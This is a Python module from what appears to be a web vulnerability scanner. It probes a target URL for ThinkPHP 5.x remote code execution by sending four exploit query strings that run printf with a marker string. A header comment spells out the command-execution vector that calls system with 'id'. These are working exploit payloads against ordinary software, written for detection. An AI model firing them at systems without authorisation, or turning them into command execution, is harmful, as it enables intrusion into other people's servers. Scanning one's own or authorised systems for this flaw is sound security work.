import asyncio
from modules.core import console

# ThinkPHP Scanner (Framework RCE)
# Focus: Multiple RCE vulnerabilities in ThinkPHP 5.x.
# Vectors: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

THINKPHP_PAYLOADS = [
    r"/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=snakebite_rce",
    r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=snakebite_rce",
    r"/?s=index/\think\Request/input&filter=printf&data=snakebite_rce",
    r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=snakebite_rce"
]

async def check_thinkphp(session, url):
    try:
        for payload in THINKPHP_PAYLOADS:
            target = f"{url.rstrip('/')}{payload}"
            
            async with session.get(target, timeout=5, ssl=False) as resp:
                text = await resp.text()
                if "snakebite_rce" in text:
                     return {
                        "url": target,
                        "type": "ThinkPHP RCE",
                        "evidence": "RCE Confirmed: 'printf' executed successfully."
                    }

    except Exception:
        pass
    return None

async def scan_thinkphp(session, url):
    """
    Scan for ThinkPHP RCE.
    """
    console.print(f"\n[bold cyan]--- ThinkPHP Scanner ---[/bold cyan]")
    
    results = []
    res = await check_thinkphp(session, url)
    if res:
         console.print(f"  [bold red][!] THINKPHP RCE VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Evidence: {res['evidence']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No ThinkPHP RCE vectors found.[/dim]")
        
    return results
